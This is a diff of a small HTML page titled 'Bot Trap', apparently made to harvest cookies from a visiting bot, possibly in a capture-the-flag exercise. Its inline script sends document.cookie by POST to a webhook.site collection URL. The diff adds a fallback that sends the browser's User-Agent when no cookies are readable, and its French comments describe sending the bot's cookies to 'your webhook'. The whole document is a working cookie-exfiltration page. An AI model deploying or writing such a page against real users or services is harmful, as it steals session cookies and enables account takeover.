@@ -2,16 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Bot Trap</title>
+    <title>Bot Trap 2.0</title>
 </head>
 <body>
-    <h1>Hello, Bot!</h1>
+    <h1>Hello Bot!</h1>
     <script>
-        // Envoie les cookies du bot vers ton webhook
-        fetch('https://webhook.site/a003a7bb-f80a-4a26-9a21-b682f52385c0', {
-            method: 'POST',
-            body: document.cookie
-        });
+        // Vérifie si des cookies sont accessibles
+        if (document.cookie) {
+            fetch('https://webhook.site/a003a7bb-f80a-4a26-9a21-b682f52385c0', {
+                method: 'POST',
+                body: document.cookie
+            });
+        } else {
+            // Si les cookies ne sont pas accessibles, envoie des infos basiques
+            fetch('https://webhook.site/a003a7bb-f80a-4a26-9a21-b682f52385c0', {
+                method: 'POST',
+                body: 'No cookies found, User-Agent: ' + navigator.userAgent
+            });
+        }
     </script>
 </body>
 </html>
